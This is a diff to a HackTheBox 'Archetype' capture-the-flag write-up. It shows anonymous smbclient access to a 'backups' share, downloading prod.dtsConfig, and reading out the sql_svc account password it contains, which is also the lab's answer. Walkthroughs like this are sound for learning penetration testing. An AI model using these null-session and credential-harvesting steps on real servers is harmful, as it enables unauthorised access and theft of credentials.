@@ -197,11 +197,74 @@ The answer for task two is **backups** since there is only one non-admin share p
 
 ### Task 3:  What is the password identified in the file on the SMB share? 
 
-- [ ] **Check the backups share for files to use for privelege escalation**
+- [X] **Check the backups share for files to use for privelege escalation**
 
-- [ ] **Download and look at the contents of the file(s) necessary for privelege escalation**
+Now that we know the non-admin share is `backups`, we can add this to the end of the smbclient terminal command using only the `-N` flag:
 
-- [ ] **Submit the password from the file**
+```
+smbclient -N \\\\<target_ip>\\backups
+```
+
+Which enables access to the SMB server and should give the following output:
+
+```
+Try "help" to get a list of possible commands.
+smb: \> 
+```
+
+So we now have access to the smb server - time to escalate priveleges by exploiting any files with sensitive information in them. To do so we just list the files in the current directory using `dir` as it is a windows based server:
+
+```
+smb: \> dir
+  .                                   D        0  Mon Jan 20 23:20:57 2020
+  ..                                  D        0  Mon Jan 20 23:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 23:23:02 2020
+
+		5056511 blocks of size 4096. 2623696 blocks available
+```
+
+
+- [X] **Download and look at the contents of the file(s) necessary for privelege escalation**
+
+**Hmm!** So we can see can see a file that contains some version of "Config" in its name and no other files in the current working directory. The easiest way to do more analysis of this is to download the `.dtsConfig` file using a get request: 
+
+```
+smb: \> get prod.dtsConfig
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+```
+
+This downloads the `.dtsConfig` file to the user directory on the local machine (however when doing many boxes this can get untidy). We really want that file in the `archetype` folder. If we check the directory using `pwd` we should be in the `/home/<home_user>/` directory, if not just change the working directory and move the file using:
+
+```
+cd
+mv prod.dtsConfig /home/<home_user>/HTB/starting_point/tier2/archetype/prod.dtsConfig
+```
+
+We can then check the file contents by first ensuring that we are in the correct working directory using `pwd` and then printing to terminal using `cat`:
+
+```
+pwd
+cat prod.dtsConfig
+```
+
+Which should print the following to the terminal window:
+
+```
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+```
+
+We can see both `User ID=ARCHETYPE\sql_svc` and `Password=M3g4c0rp123`
+
+- [X] **Submit the password from the file**
+
+Let's submit the password M3g4c0rp123 to HackTheBox!
 
 ### Task 4
 
